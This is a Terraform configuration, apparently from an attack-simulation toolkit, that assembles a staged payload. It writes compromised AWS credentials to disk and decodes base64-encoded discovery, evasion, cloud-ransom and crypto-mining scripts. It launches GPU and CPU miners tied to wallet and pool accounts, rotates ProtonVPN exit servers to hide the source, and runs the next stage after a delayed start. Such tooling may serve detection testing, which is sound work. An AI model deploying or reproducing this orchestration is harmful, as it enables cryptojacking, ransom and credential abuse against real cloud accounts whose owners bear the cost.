locals {
    attack_dir = "/cloud-tunnel"
    script = "hostcrypto"
    script_type = "terraform"
    attack_type = "host_cryptomining"
    aws_creds = join("\n", [ for u,k in var.inputs["compromised_credentials"]: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
    cd ${local.attack_dir}
    ${local.aws_creds}
    echo '${(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
    echo '${(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
    echo '${(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
    echo '${(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
    echo '${(local.protonvpn-paid)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-paid
    echo '${(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
    echo '${(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
    echo '${(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
    echo '${(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
    echo '${(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
    echo '${(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
    echo '${(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/terraform.sh
    echo '${(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
    echo '${(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/terraform.sh
    log "Starting as background job..."
    if [ "${var.inputs["protonvpn_tier"]}" == "0" ]; then
        for i in $(echo "US NL-FREE#1 JP-FREE#3 NL-FREE#4 NL-FREE#8 US-FREE#5 NL-FREE#9 NL-FREE#12 NL-FREE#13 NL-FREE#14 NL-FREE#15 NL-FREE#16 US-FREE#13 US-FREE#32 US-FREE#33 US-FREE#34 NL-FREE#39 NL-FREE#52 NL-FREE#57 NL-FREE#87 NL-FREE#133 NL-FREE#136 NL-FREE#148 US-FREE#52 US-FREE#53 US-FREE#54 US-FREE#51 NL-FREE#163 NL-FREE#164 US-FREE#58 US-FREE#57 US-FREE#56 US-FREE#55"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
        bash auto-free.sh
    else
        for i in $(echo "AU CR IS JP LV NL NZ SG SK US"); do cp .env-protonvpn-paid .env-protonvpn-paid-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-paid-$i; done
        bash auto-paid.sh
    fi;
    log "Done."
    EOT

    protonvpn       = base64encode(templatefile(
                                "${path.module}/../resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.inputs["protonvpn_user"]
                                    protonvpn_password = var.inputs["protonvpn_password"]
                                    protonvpn_server = var.inputs["protonvpn_server"]
                                    protonvpn_tier = tostring(var.inputs["protonvpn_tier"])
                                    protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                    protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                }
                            ))
    protonvpn-paid       = base64encode(templatefile(
                                "${path.module}/../resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.inputs["protonvpn_user"]
                                    protonvpn_password = var.inputs["protonvpn_password"]
                                    protonvpn_server = var.inputs["protonvpn_server"]
                                    protonvpn_tier = 2
                                    protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                    protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                }
                            ))
    protonvpn-baseline  = base64encode(templatefile(
                                "${path.module}/../resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.inputs["protonvpn_user"]
                                    protonvpn_password = var.inputs["protonvpn_password"]
                                    protonvpn_server = "US"
                                    protonvpn_tier = tostring(var.inputs["protonvpn_tier"])
                                    protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                    protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                }
                            ))
    auto-free   = base64encode(templatefile(
                                "${path.module}/../resources/auto-free.sh.tpl",
                                {
                                    compromised_keys_user = var.inputs["compromised_keys_user"]
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                    attack_delay = var.inputs["attack_delay"]
                                }
                            ))
    auto-paid   = base64encode(templatefile(
                                "${path.module}/../resources/auto-paid.sh.tpl",
                                {
                                    compromised_keys_user = var.inputs["compromised_keys_user"]
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                    attack_delay = var.inputs["attack_delay"]
                                }
                            ))
    baseline    = base64encode(templatefile(
                                "${path.module}/../resources/baseline.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            ))
    discovery   = base64encode(templatefile(
                                "${path.module}/../resources/discovery.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            ))
    evasion     = base64encode(templatefile(
                                "${path.module}/../resources/evasion.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            ))
    cloudransom = base64encode(templatefile(
                                "${path.module}/../resources/cloudransom.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            ))
    cloudcrypto = base64encode(templatefile(
                                "${path.module}/../resources/cloudcrypto.tf.tpl",
                                {
                                    name = "crypto-gpu-miner-${var.inputs["environment"]}-${var.inputs["deployment"]}"
                                    instances = 12
                                    wallet = var.inputs["ethermine_wallet"]
                                    region = var.inputs["region"]
                                }
                            ))
    hostcrypto  = base64encode(templatefile(
                                "${path.module}/../resources/hostcrypto.tf.tpl",
                                {
                                    name = "host-cpu-miner-${var.inputs["environment"]}-${var.inputs["deployment"]}"
                                    region = var.inputs["region"]
                                    instances = 1
                                    minergate_user = var.inputs["minergate_user"]
                                    nicehash_user = var.inputs["nicehash_user"]
                                }
                            ))
    
    terraform  = base64encode(templatefile(
                                "${path.module}/../resources/terraform.sh.tpl",
                                {
                                }
                            ))
    
    start       = base64encode(templatefile(
                                "${path.module}/../resources/start.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            ))

    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = [
            {
                name = "${basename(abspath(path.module))}_auto-free.sh"
                content = local.auto-free
            },
            {
                name = "${basename(abspath(path.module))}_auto-paid.sh"
                content = local.auto-paid
            },
            {
                name = "${basename(abspath(path.module))}_baseline.sh"
                content = local.baseline
            },
            {
                name = "${basename(abspath(path.module))}_discovery.sh"
                content = local.discovery
            },
            {
                name = "${basename(abspath(path.module))}_evasion.sh"
                content = local.evasion
            },
            {
                name = "${basename(abspath(path.module))}_cloudransom.sh"
                content = local.cloudransom
            },
            {
                name = "${basename(abspath(path.module))}_terraform.sh"
                content = local.terraform
            },
            {
                name = "${basename(abspath(path.module))}_start.sh"
                content = local.start
            }
        ]
    }
}